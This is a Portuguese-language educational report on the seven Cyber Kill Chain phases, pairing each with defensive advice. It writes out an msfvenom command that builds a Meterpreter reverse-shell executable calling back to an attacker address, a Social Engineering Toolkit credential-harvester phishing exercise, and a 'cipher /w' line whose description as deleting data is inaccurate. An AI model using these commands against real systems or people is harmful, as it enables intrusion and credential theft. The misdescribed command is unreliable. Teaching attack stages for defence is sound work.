Cyber Kill Chain - Full Report

Objetivo
Entender as 7 etapas que hackers usam em ataques avançados (da preparação ao objetivo final) e como se defender em cada fase.

As 7 Etapas da Cyber Kill Chain

1. Reconhecimento (Information Gathering)

O que acontece:
O atacante coleta informações públicas sobre o alvo (ex: e-mails, redes sociais, portas abertas).

Ferramentas usadas:
whois empresa.com  # Mostra dono do domínio
nmap -sV 192.168.1.1  # Verifica portas abertas

Como se proteger:
Limitar informações públicas em redes sociais.
Usar firewalls para esconder portas desnecessárias.

2. Armamento (Weaponization)

O que acontece:
O atacante cria/customiza malware para explorar vulnerabilidades do alvo.

Exemplo:
Anexo de e-mail com documento Word malicioso.

Como se proteger:
Treinar colaboradores para não abrir anexos suspeitos.
Usar antivírus com detecção em tempo real.

3. Entrega (Delivery)

O que acontece:
O malware é enviado por e-mail, USB infectado ou site falso.

Ferramentas usadas:
Phishing kits (para criar e-mails falsos).

Como se proteger:
Verificar URLs antes de clicar (passar o mouse para ver o link real).
Bloquear dispositivos USB desconhecidos.

4. Exploração (Exploitation)

O que acontece:
O malware explora uma vulnerabilidade no sistema (ex: programa desatualizado).

Exemplo de comando:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 -f exe > malware.exe

Como se proteger:
Atualizar todos os softwares regularmente.

5. Instalação (Installation)

O que acontece:
O malware se instala no sistema para manter acesso persistente.

Técnica comum:
Criar backdoor no Registro do Windows.

Como se proteger:
Monitorar processos desconhecidos no Gerenciador de Tarefas.

6. Comando e Controle (C2)

O que acontece:
O atacante controla o malware remotamente.

Ferramentas:
Metasploit Framework.

Como se proteger:
Bloquear conexões suspeitas no firewall.

7. Ações no Objetivo

O que acontece:
Roubo de dados, criptografia de arquivos (ransomware) ou destruição do sistema.

Exemplo:
cipher /w:C:\  # Apaga dados permanentemente (Windows)

Como se proteger:
Fazer backups frequentes.

Exercício Prático

Cenário: Simular um ataque phishing com o SET (Social Engineering Toolkit):

setoolkit
> 1 (Social-Engineering Attacks)
> 2 (Website Attack Vectors)
> 3 (Credential Harvester)

Lições Aprendidas
Ataques são planejados em etapas – interromper qualquer fase pode parar o ataque.
Treinamento de usuários é tão importante quanto firewalls.

💡 Dica Extra
Para se aprofundar:
Livro: "The Cuckoo's Egg" (sobre rastreamento de hackers).
Ferramenta: MITRE ATT&CK (mapeia táticas de ataque).